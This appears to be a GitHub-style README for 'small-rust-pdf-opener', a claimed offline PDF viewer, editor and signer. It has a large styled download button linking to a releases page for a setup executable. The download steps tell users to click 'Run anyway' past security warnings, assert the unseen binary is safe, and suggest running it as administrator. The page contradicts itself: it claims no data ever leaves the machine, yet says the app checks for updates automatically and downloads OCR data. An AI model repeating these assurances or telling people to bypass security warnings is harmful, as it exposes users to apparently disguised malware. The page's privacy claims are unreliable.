<h1>🔍 small-rust-pdf-opener - View, Edit, and Sign PDFs Offline</h1>

<p align="center">
  <a href="https://github.com/adycerr3192/small-rust-pdf-opener/releases" style="display:inline-block;background:linear-gradient(135deg,#667eea,#764ba2);color:white;padding:18px 36px;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.4);">⬇️ Download small-rust-pdf-opener</a>
</p>

## 🚀 Getting Started

Welcome! This application lets you open, view, edit, and sign PDF files on your computer. It works entirely offline, keeping your documents private. Follow the simple steps below to download and run it.

### Step 1: Download the Application

Visit the link below to download the latest version:

👉 **<a href="https://github.com/adycerr3192/small-rust-pdf-opener/releases">Download from GitHub Releases</a>**

This link takes you to a page where you can find the file for your computer. Look for the file named something like `small-rust-pdf-opener-setup.exe` or `small-rust-pdf-opener.zip`.

### Step 2: Run the Application

Once the download is complete, double-click the downloaded file to start the program. If a security warning appears, click "Run anyway" or "More info" then "Run anyway" – the app is safe and open source.

## 🖥️ System Requirements

Your computer needs:
- **Windows 10** or newer (64-bit)
- **macOS 10.15** (Catalina) or newer
- **Linux** (any modern distribution with GTK3)
- At least **500 MB** of free disk space
- **4 GB** of RAM (recommended)
- An internet connection is **only needed** for the first download or optional OCR feature

## ✨ Features

### 📖 View and Scroll
Open any PDF file and scroll through pages smoothly. Zoom in and out to see details.

### ✂️ Crop Pages
Trim unwanted margins or sections from any page. Useful for removing white space or focusing on content.

### 📦 Compress PDFs
Reduce file size without losing quality. Great for email attachments or saving space.

### ✍️ Visual Signature
Add your handwritten signature to documents. Use your mouse or touchscreen to draw directly on the PDF.

### 🔐 PKCS#12 Digital Signing
Sign documents with a digital certificate (PKCS#12 format). This creates a legally valid electronic signature.

### 📄 Offline OCR
Convert scanned images to searchable text – all on your computer, no internet needed. Turn on in settings for select languages.

### 🔒 Privacy First
All processing happens locally. No data ever leaves your machine. Perfect for sensitive documents.

## 🛠️ How to Use

### Opening a PDF
1. Launch the app.
2. Click "Open" or drag a PDF file onto the window.
3. Use the scrollbar or arrow keys to navigate pages.

### Cropping
1. Click "Crop" in the toolbar.
2. Drag a rectangle over the area to keep.
3. Click "Apply" – the rest is removed.

### Compressing
1. Open a PDF.
2. Go to "File" → "Compress".
3. Choose quality level (High, Medium, Low).
4. Save the compressed copy.

### Adding a Signature
1. Click "Sign" → "Draw Signature".
2. Draw with your mouse or finger.
3. Place the signature on the page.
4. Save the file.

### Digital Signing
1. Click "Sign" → "PKCS#12 Sign".
2. Select your certificate file (.p12 or .pfx).
3. Enter the certificate password.
4. Click "Sign" to apply.

### Using OCR
1. Open a scanned PDF (images, not text).
2. Click "Tools" → "Run OCR".
3. Wait for processing (depends on page count).
4. Now you can select and copy text.

## ❓ Frequently Asked Questions

**Is it free?**
Yes! The software is completely free and open source under the AGPL license.

**Is my data safe?**
Absolutely. Everything runs on your computer. No internet connection is used for viewing, editing, or signing.

**Can I edit text in a PDF?**
No, this app focuses on layout changes (crop, compress) and signing. For text editing, you need a full PDF editor.

**Why is it called "small-rust-pdf-opener"?**
The name describes its core purpose – a small, fast PDF opener built with the Rust programming language.

**How do I update?**
Download the latest version from the same link. The app will check for updates automatically.

## 🐛 Troubleshooting

**App won't start**
- Make sure you downloaded the correct version for your operating system.
- Try running as administrator (right-click → "Run as administrator").
- Check your antivirus – it might block unknown apps.

**Can't open a PDF**
- Ensure the file isn't corrupted.
- Try another PDF to confirm the app works.
- The file might be password protected – this app doesn't support passwords yet.

**OCR not working**
- The first run downloads language data (about 50 MB) – you need internet once.
- Ensure your scanned pages are clear and not too blurry.

**Signature not appearing**
- Try drawing more slowly with your mouse.
- Increase the signature pen width in settings.

## 📝 License

This project is licensed under the GNU Affero General Public License v3.0 (AGPL-3.0). You can use, modify, and share it freely. See the LICENSE file for details.

## 🙏 Acknowledgments

Built with:
- **egui** – immediate mode GUI framework
- **MuPDF** – PDF rendering engine
- **Tesseract** – OCR engine (offline)
- **Rust** – programming language

## 🌐 Keywords

agpl, desktop-app, egui, lightweight, macos, mupdf, ocr, offline, pdf, pdf-editor, pdf-viewer, privacy, rust